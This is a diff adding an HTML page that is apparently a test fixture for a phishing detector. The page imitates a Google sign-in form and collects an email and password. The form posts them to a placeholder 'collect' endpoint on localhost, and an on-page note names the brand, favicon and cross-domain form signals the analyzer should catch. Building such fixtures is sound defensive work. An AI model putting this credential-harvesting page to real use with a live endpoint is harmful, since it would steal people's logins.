@@ -1,0 +1,88 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Sign in - Google Accounts</title>
+    <link rel="icon" href="https://www.google.com/favicon.ico" />
+    <style>
+      body {
+        font-family: 'Segoe UI', Roboto, Arial, sans-serif;
+        max-width: 420px;
+        margin: 80px auto;
+        padding: 0 16px;
+        background: #f5f5f5;
+      }
+
+      .card {
+        background: white;
+        border-radius: 8px;
+        padding: 48px 40px 36px;
+        box-shadow: 0 2px 10px rgba(0, 0, 0, 0.08);
+      }
+
+      h1 {
+        font-size: 24px;
+        font-weight: 400;
+        margin: 0 0 8px;
+      }
+
+      .subtitle {
+        color: #555;
+        font-size: 16px;
+        margin: 0 0 24px;
+      }
+
+      form {
+        display: grid;
+        gap: 16px;
+      }
+
+      input {
+        font: inherit;
+        padding: 13px 14px;
+        border: 1px solid #ddd;
+        border-radius: 4px;
+      }
+
+      button {
+        font: inherit;
+        padding: 10px;
+        border: none;
+        border-radius: 4px;
+        background: #1a73e8;
+        color: white;
+        cursor: pointer;
+        font-weight: 500;
+      }
+
+      .note {
+        margin-top: 16px;
+        padding: 12px;
+        background: #fff3cd;
+        border-radius: 4px;
+        font-size: 13px;
+        color: #856404;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="card">
+      <h1>Sign in</h1>
+      <p class="subtitle">Use your Google Account</p>
+
+      <form id="phishForm" action="http://127.0.0.1:9/collect" method="post">
+        <input id="email" name="email" type="email" placeholder="Email or phone" autocomplete="username" />
+        <input id="password" name="password" type="password" placeholder="Password" autocomplete="current-password" />
+        <button type="submit">Next</button>
+      </form>
+    </div>
+
+    <p class="note">
+      <strong>Gym fixture:</strong> This page impersonates a Google login from a non-Google domain.
+      The content analyzer should detect: BRAND_DOMAIN_MISMATCH (title contains "Google"),
+      FAVICON_BRAND_MISMATCH (favicon from google.com), and FORM_ACTION_CROSS_DOMAIN_POST
+      (form POSTs to a different domain).
+    </p>
+  </body>
+</html>
